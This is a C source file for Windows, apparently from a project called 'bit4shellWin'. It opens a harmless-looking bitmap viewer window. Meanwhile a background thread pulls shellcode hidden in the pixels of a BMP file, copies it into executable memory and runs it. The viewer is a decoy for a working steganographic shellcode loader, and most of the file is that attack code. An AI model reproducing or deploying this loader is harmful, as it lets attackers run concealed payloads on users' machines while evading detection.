#include <windows.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winbase.h>

#include "src/structs.h"
#include "src/steg.h"

#define SDL_MAIN_HANDLED

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

DWORD WINAPI Runner( LPVOID lpParam ){
    bitmap_header head;
    dib_header dbhead;
    FILE *bitmap_file;
    char *bitmap_fname = "C:\\Users\\user\\bit4shellWin\\32bit.bmp";


    bitmap_file = fopen(bitmap_fname,"rb");
    if (bitmap_file == NULL) {
        printf("Error: Could not open %s.\n", bitmap_fname);
        return 0;
    }

    fread(&head,    sizeof(bitmap_header), 1, bitmap_file);
    fread(&dbhead,  sizeof(dib_header), 1, bitmap_file);

    if (head.magic[0] != 0x42 || head.magic[1] != 0x4d) {
        printf("Error: %s Not a bmp file.\n", bitmap_fname);
        fclose(bitmap_file);
        return 0;
    }
    // may be optimized. it dont need to be done for all cases, like 'describe'.
    uint32_t size = ((dbhead.w_pixels * dbhead.h_pixels) * (dbhead.bits_pixel/(uint32_t)8));
    uint8_t *data = (uint8_t *)malloc(size);
    fread(data,  size, 1, bitmap_file);
    fclose(bitmap_file);

    if (test_for_saved(data, size, 1) == 1) {
        /*
            This function will return the shellcode to "volume",
            You may do anything with this data.
        */
        uint8_t *volume = read_from_byte_array(data, size);
        uint32_t volume_size = get_hidden_data_size(data, size);

        void *exec = VirtualAlloc(0, volume_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, volume, volume_size);
        ((void(*)())exec)();

        free(volume);
        return 0;
    }
}

int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevIns, LPSTR lpszArgument, int iShow) {

    MSG  msg;
    WNDCLASSW wc = {0};

    int Data_Handle = 1;
    HANDLE Thread_Handles[1];
    HANDLE RunnerHandler = CreateThread( NULL, 0,Runner, &Data_Handle, 0, NULL);
    if ( RunnerHandler == NULL)
        ExitProcess(Data_Handle);
    Thread_Handles[0] = RunnerHandler;

    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpszClassName = L"BitMap Vis";
    wc.hInstance     = hInstance;
    wc.hbrBackground = GetSysColorBrush(COLOR_3DFACE);
    wc.lpfnWndProc   = WndProc;
    wc.hCursor       = LoadCursor(0, IDC_ARROW);

    RegisterClassW(&wc);

    CreateWindowW(wc.lpszClassName, L"BitMap Vis",
    WS_OVERLAPPEDWINDOW | WS_VISIBLE,
    100, 100, 280, 220, NULL, NULL, hInstance, NULL);

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }


    return (int) msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HBITMAP hBitmap;
    HDC hdc;
    PAINTSTRUCT ps;
    BITMAP bitmap;
    HDC hdcMem;
    HGDIOBJ oldBitmap;

    switch(msg) {

    case WM_CREATE:
        hBitmap = (HBITMAP) LoadImageW(NULL, L"C:\\Users\\pietr\\CLionProjects\\bit4shellWin\\32bit.bmp",
                                       IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
        if (hBitmap == NULL) {
            MessageBoxW(hwnd, L"Failed to load image", L"Error", MB_OK);
        }
    break;

    case WM_PAINT:
        hdc = BeginPaint(hwnd, &ps);

        hdcMem = CreateCompatibleDC(hdc);
        oldBitmap = SelectObject(hdcMem, hBitmap);

        GetObject(hBitmap, sizeof(bitmap), &bitmap);
        BitBlt(hdc, 5, 5, bitmap.bmWidth, bitmap.bmHeight,
        hdcMem, 0, 0, SRCCOPY);

        SelectObject(hdcMem, oldBitmap);
        DeleteDC(hdcMem);

        EndPaint(hwnd, &ps);

        break;

    case WM_DESTROY:
        DeleteObject(hBitmap);
        PostQuitMessage(0);

    return 0;
    }

    return DefWindowProcW(hwnd, msg, wParam, lParam);
}